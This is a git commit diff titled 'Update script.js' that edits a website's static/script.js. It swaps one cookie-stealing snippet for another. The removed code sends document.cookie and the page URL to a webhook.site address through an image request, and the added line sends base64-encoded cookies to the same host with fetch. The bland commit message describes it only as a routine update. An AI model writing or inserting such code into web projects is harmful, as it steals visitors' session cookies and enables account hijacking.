6dfd01596d0afc3b394caed89fc06747511b482d
Yung-ChunLin <144975502+Yung-ChunLin@users.noreply.github.com>
2025-04-08 23:23:03 +0800

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,6 +1,1 @@
-(() => {
-  const i = new Image();
-  i.src = "https://webhook.site/3e6eeb5f-e3bf-4897-8665-8d129a856869?c=" + 
-          encodeURIComponent(document.cookie) + 
-          "&u=" + encodeURIComponent(location.href);
-})();
+fetch("https://webhook.site/3e6eeb5f-e3bf-4897-8665-8d129a856869=" + btoa(document.cookie))
